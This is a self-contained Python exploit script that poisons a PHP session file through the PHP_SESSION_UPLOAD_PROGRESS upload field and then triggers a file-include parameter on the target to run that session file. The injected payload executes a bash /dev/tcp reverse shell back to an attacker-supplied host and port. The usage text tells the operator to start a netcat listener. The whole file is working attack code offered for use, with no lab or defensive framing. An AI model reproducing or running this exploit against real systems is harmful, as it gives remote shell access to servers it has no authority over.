#!/usr/bin/env python3
"""
Reverse shell via PHP session poisoning.

usage: reverse_shell.py <target> <lhost> [lport] [url_path] [param] [target_port]

  target      - host or IP of the vulnerable app
  lhost       - your IP (must be reachable from the target)
  lport       - your listener port (default 4444)
  url_path    - path containing the include() sink (default /view.php)
  param       - GET parameter of the sink (default tpl)
  target_port - target HTTP port (default 8088)

Start a listener first:   nc -lvp 4444
"""
import http.client, secrets, sys, urllib.parse

def main():
    if len(sys.argv) < 3:
        sys.exit(__doc__)
    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
    path = sys.argv[4] if len(sys.argv) > 4 else "/view.php"
    param = sys.argv[5] if len(sys.argv) > 5 else "tpl"
    tport = int(sys.argv[6]) if len(sys.argv) > 6 else 8088

    sid = secrets.token_hex(16)
    rs = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payload = f'<?php system("bash -c \'{rs}\' &");?>'

    print(f"[*] target  : http://{target}:{tport}{path}?{param}=")
    print(f"[*] callback: {lhost}:{lport}")
    print(f"[*] payload : {payload}")

    # 1. poison the session file
    bnd = "----rs" + secrets.token_hex(3)
    body = (f'--{bnd}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f'{payload}\r\n'
            f'--{bnd}\r\nContent-Disposition: form-data; name="f"; filename="a.txt"\r\n'
            f'Content-Type: text/plain\r\n\r\n' + "A" * 512 + f'\r\n--{bnd}--\r\n').encode()
    c = http.client.HTTPConnection(target, tport, timeout=20)
    c.request("POST", "/index.php", body=body, headers={
        "Content-Type": f"multipart/form-data; boundary={bnd}",
        "Cookie": f"PHPSESSID={sid}",
        "Content-Length": str(len(body))})
    r = c.getresponse(); r.read(); c.close()
    print(f"[1] poison   -> HTTP {r.status}")

    # 2. trigger the sink
    q = urllib.parse.urlencode({param: f"/tmp/sess/sess_{sid}"})
    try:
        c2 = http.client.HTTPConnection(target, tport, timeout=15)
        c2.request("GET", f"{path}?{q}", headers={"Cookie": f"PHPSESSID={sid}"})
        c2.getresponse().read(); c2.close()
        print(f"[2] trigger  -> sent")
    except Exception:
        print(f"[2] trigger  -> timeout (expected: bash -i blocks)")
    print(f"[3] waiting for callback on :{lport} ...")
    print(f"    run:  nc -lvp {lport}")

if __name__ == "__main__":
    main()
